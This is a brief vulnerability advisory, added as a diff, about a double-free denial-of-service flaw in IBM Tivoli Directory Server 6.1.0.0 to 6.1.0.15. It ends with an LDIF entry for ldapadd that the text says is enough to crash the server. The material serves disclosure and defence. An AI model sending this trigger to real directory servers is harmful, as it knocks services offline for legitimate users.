@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/30010/info
+
+IBM Tivoli Directory Server is prone to a denial-of-service vulnerability because the server contains a double-free error.
+
+An attacker can exploit this issue to crash the affected server with a SIGSEGV fault, denying service to legitimate users.
+
+Tivoli Directory Server 6.1.0.0 - 6.1.0.15 are affected. 
+
+The following 'ldapadd' entry is sufficient to trigger the issue:
+
+dn: globalGroupName=GlobalAdminGroup,cn=ibmpolicies
+globalGroupName: GlobalAdminGroup
+objectclass: top
+objectclass: ibm-globalAdminGroup 
